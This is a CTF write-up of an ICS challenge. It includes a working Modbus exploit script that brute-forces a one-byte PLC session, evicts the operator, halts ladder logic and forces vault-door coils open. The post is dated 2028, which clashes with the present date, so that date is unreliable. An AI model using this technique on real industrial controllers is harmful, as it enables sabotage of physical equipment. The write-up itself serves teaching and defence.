---
title: "Knock Knock?"
date: 2028-06-11 09:00:00 -0500
categories: [HackTheBox, Challenges, ICS]
tags: [hackthebox, challenge, ics, modbus, plc, session-hijack, auth-bypass, cwe-294, cwe-284]
description: "A Medium ICS challenge: a PLC hides its controls behind a home-rolled session/reservation layer carried in a custom Modbus function code — but the session token is a single byte, so you steal the operator's live session, evict them, take control yourself, and force the vault doors open with the write function code the guard forgot to block."
---

## Overview

Knock Knock is a Medium **ICS** (Industrial Control Systems) challenge. A PLC exposes its door controls over Modbus/TCP, but wraps every action behind a home-made "reservation + session" login carried inside a **custom Modbus function code (`0x66`)**. The login looks locked down — the box boots already reserved by an "operator" and normal writes are disabled — yet the session identifier is a single byte. Steal the operator's live session, release their reservation, take your own, stop the ladder logic, and open the vault doors with a write function code the access guard never covered. The flag is read straight out of the PLC's holding registers.

## The technique

You are given `client.py` (a pymodbus skeleton hinting at a custom function code), a packet capture of the operator talking to the PLC, and a note listing the door coils (`0x01` main, `0x02` secondary), the fact that the flag lives in **holding register 123**, the error codes, and two crucial operational hints: the PLC scans once per second and *"the PLC logic may override modbus write commands"*, and the doors take ~10 seconds to fully open.

Reading the capture reveals the wire format. Everything is wrapped in function code `0x66`:

```
request : [0x66][session:1][command:1][args...]
response: [0x66][session][command][status][data...]      0xff = OK, 0xf0 + 0xE0xx = error
```

Sweeping commands `0x00`–`0xff` and reading the status byte maps the whole menu: `0x10`/`0x11`/`0x12` take/release/query reservation, `0x45`/`0x46` start/stop the ladder logic, `0x52`/`0x53` enable/disable Modbus writes, `0x50`/`0x51` leak device info.

The trap: the PLC boots **reserved by a live "operator" bot** (the constant polling in the capture). Taking a reservation returns `E006` "already reserved", releasing returns `E008` "invalid session", and single-coil writes (FC05) are rejected. Every useful action needs a session, and the only session-issuer — reserving — is blocked. That is an intentional deadlock, and breaking it is the challenge.

## Solution

The exploit is a five-move chain against the broken session layer:

1. **Steal the operator's session.** The session id is one byte, and the operator's is periodically live. Brute all 256 values on the "enable write" command (`0x52`) until one answers `0xff` instead of "invalid session" — that value (it was `0x98`) is the operator's live session. This is [CWE-294](https://cwe.mitre.org/data/definitions/294.html) — a token that short is not authentication.
2. **Evict the operator.** With the stolen session, release their reservation (`0x11`). Neither release nor enable-write checked that *you* owned the reservation — only that *some* session existed ([CWE-284](https://cwe.mitre.org/data/definitions/284.html)).
3. **Take your own reservation** (`0x10`, any owner name) to get a legitimate session of your own.
4. **Enable writes (`0x52`) and stop the ladder logic (`0x46`).** The logic re-closes the door coils on every 1-second scan, which keeps resetting the 10-second "door fully open" timer — stopping it lets your coil state latch.
5. **Open the doors with FC15.** Single-coil write (FC05) was disabled, but **write-multiple-coils (FC15)** was left open — same effect, different function code, and the guard didn't cover it. Set door coils 1 and 2, wait ~7 seconds, then read the flag out of holding registers from address 123 (one ASCII character per 16-bit register).

The full solver, `solve.py` (raw-socket Modbus TCP — no pymodbus needed):

```python
#!/usr/bin/env python3
"""Knock Knock? — hijack the operator's 1-byte session -> release its reservation ->
take our own -> enable write -> STOP the ladder logic (so it can't clear the door coils
each 1s scan) -> FC15 open door coils 1&2 -> flag lands in holding registers @123,
one ASCII char per 16-bit register."""
import socket, struct, sys, time

FC = 0x66
KNOWN_BOT_SESSION = 0x98   # observed live; else brute 0x00..0xff on func 0x52
_txn = 0

def frame(pdu):
    global _txn
    _txn = (_txn + 1) & 0xffff
    return struct.pack('>HHH', _txn, 0, len(pdu) + 1) + b'\x00' + pdu

def recv_pdu(s):
    hdr = b''
    while len(hdr) < 6:
        d = s.recv(6 - len(hdr))
        if not d: return b''
        hdr += d
    length = struct.unpack('>HHH', hdr)[2]
    body = b''
    while len(body) < length:
        d = s.recv(length - len(body))
        if not d: break
        body += d
    return body[1:]

def xact(s, pdu):
    s.sendall(frame(pdu)); return recv_pdu(s)

def cust(s, session, func, args=b''):
    return xact(s, bytes([FC, session, func]) + args)

def read_holding(s, addr, count):
    return xact(s, bytes([0x03]) + struct.pack('>HH', addr, count))

def write_coils_fc15(s, start, bits):
    return xact(s, bytes([0x0F]) + struct.pack('>HH', start, 2) + bytes([1, bits]))

def decode_flag(fc03_payload):
    body = fc03_payload[1:]
    regs = [body[i:i+2] for i in range(0, len(body) - 1, 2)]
    return ''.join(chr(r[1]) if r[0] == 0 and 32 <= r[1] < 127 else '' for r in regs)

def solve(host, port):
    s = socket.create_connection((host, port), timeout=5)
    sess = None
    if cust(s, KNOWN_BOT_SESSION, 0x52)[3:4] == b'\xff':
        sess = KNOWN_BOT_SESSION
    else:
        for cand in range(0x100):
            r = cust(s, cand, 0x52)
            if r and len(r) > 3 and r[3] == 0xff:
                sess = cand; break
    if sess is None:
        raise SystemExit("no live session to hijack; respawn and retry")
    cust(s, sess, 0x11)                          # release operator's reservation
    tk = cust(s, 0x00, 0x10, bytes([2]) + b'me')  # take our own
    mine = tk[4] if (tk and len(tk) > 4 and tk[3] == 0xff) else sess
    cust(s, mine, 0x52)                          # enable write
    cust(s, mine, 0x46)                          # stop logic -> coils latch
    write_coils_fc15(s, 1, 0b11)                 # open both doors
    for _ in range(20):
        flag = decode_flag(read_holding(s, 123, 60)[1:])
        if '}' in flag:
            return flag[:flag.index('}') + 1]
        time.sleep(1)
    raise SystemExit("doors did not open in time")

if __name__ == '__main__':
    print(solve(sys.argv[1], int(sys.argv[2])))
```

Running it against the live instance drives the doors open and prints the flag:

```console
$ python3 solve.py <target-host> <target-port>
HTB{...}
```

## Why it worked

Three defensive failures compound. The session token is a single byte, so it is trivially brute-forced ([CWE-294](https://cwe.mitre.org/data/definitions/294.html)). The privileged commands (release, enable-write) verify only that *a* session exists, never that the caller owns the reservation, so a captured session is enough to evict the legitimate owner ([CWE-284](https://cwe.mitre.org/data/definitions/284.html)). And the write-access guard is scoped to a single function code (FC05) rather than the operation, so the sibling multi-write function (FC15) sails straight through. Stopping the ladder logic is the final piece: the logic otherwise clears the door outputs every scan, so it has to be halted for the actuator to reach its end state.

## Fix / defense

- Do not roll a custom session layer over Modbus. If you must, use a long, cryptographically random token, expire it server-side, and **bind every privileged action to the reservation owner** — not merely "a session exists".
- Scope access control to the **operation**, not one function code — deny FC15/FC16/FC22 to protected addresses too, not just FC05/FC06.
- Never expose an ICS bus to a user-reachable network. Segment it to an OT VLAN behind an authenticating gateway / ICS firewall that whitelists function codes and register ranges.
- Rate-limit and alert on session-token enumeration and rapid reservation churn.
